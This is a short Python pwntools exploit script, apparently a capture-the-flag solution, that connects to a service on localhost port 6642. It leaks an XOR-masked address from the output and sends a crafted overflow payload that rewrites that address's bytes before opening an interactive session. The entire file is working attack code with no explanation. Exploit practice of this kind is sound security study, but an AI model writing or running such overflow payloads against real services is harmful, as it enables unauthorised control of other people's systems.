from pwn import *

p = remote("localhost",6642)

#state 1
p.recv(200)
p.sendline("A"*32)
p.recv(200)
p.sendline("x"*32)
ret = p.recv(400)

addr_after_xor = ret[0x73:0x77]
addr_org = [chr(ord(a) ^ 0x39) for a in addr_after_xor]

#state 2

payload = "x"*4
payload += "\x89\x87\x87\x87"
payload += "x"*12
payload += chr(ord(addr_after_xor[0])^0xf4^0x41)
payload += chr(ord(addr_after_xor[1])^(ord(addr_org[1]) & 0xf0 | 0xa)^0x41)
payload += chr(ord(addr_after_xor[2])^ord(addr_org[2])^0x41)
payload += chr(ord(addr_after_xor[3])^ord(addr_org[3])^0x41)
payload += "x"*8

#p.recv(200)
p.sendline("A"*32)
#p.recv(200)
p.sendline(payload)

t = p.recv(400)
print hexdump(t)
p.interactive()
